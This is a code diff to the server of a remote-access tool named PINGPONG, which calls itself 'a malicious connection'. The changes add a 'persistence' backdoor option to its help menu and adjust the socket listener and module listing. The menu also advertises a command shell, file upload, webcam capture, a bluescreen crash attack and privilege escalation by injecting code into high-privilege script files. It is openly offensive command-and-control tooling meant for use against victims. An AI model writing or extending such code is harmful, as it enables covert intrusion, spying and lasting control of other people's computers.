@@ -106,7 +106,6 @@ def startserver(printf, ip='127.0.0.1', port='624', is_input=False, is_auto=True
 				s.close()
 				break
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	socket.setdefaulttimeout(5)
 	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 	s.bind((ip, port))
 	s.listen(10)
@@ -174,13 +173,14 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
 				cmd : make a cmd connection
 				getinformation : to obtain some information(priv, username, etc.) of this connection
 				upload : upload your file
+				persistence : leave a backdoor on the attacked host
 			media:
 				cam_shot : take shot
 			special_attacks:
 				bluescreen : make a bluescreen on the attacked host
 			priv:
 				priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher""")
-		
+
 	def ask_for_choice(list=False, print_out=True):
 		if PINGPONG_script.addsend.App_send("SHOW_ALL_USAGE_APP", False, conn, addr, my_addr):
 			all_mod_usage_dict = {}
@@ -192,7 +192,8 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
 					scripts = []
 					for scr in os.listdir(f'./PINGPONG_script/{mod}'):
 						usage = os.path.splitext(scr)[0]
-						scripts.append(usage)
+						if scr != 'TEMP' and scr != 'SOURCE_FILE':
+							scripts.append(usage)
 					all_mod_usage_dict[mod] = scripts
 			conn.send(b'OK')
 			amount_of_usage = conn.recv(1024)
